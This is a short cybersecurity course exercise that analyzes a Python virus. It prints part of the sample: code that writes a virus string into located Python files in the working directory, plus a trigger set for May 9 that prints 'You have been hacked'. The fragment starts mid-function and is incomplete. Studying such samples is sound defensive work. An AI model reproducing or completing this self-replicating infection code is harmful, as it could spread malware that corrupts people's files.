# Script Name:                  Ops 301 - Challenge 14
# Author:                       Amleset Tesfamariam, CF Ops lecture 301
# Date of latest revision:      09/23/2023
# Purpose:                      To analyze a Python script that contains malware.
# Reason:                       It is important to know how to recognize, analyze, and distinguish when, why, and how the code is causing issues. Furthermore, how to explain this to people in plain terms.

        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# Function to detonate the virus based on the date of May 9th
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Locate Python files in the directory path
files_targeted = locate(os.path.abspath(""))

# Infect the targeted files
infect(files_targeted)

# Checking if detonation was properly executed 
detonate()


# End 

In Summary: This python code infects Python files by inserting additional code and checks to see if the date is May 9th.
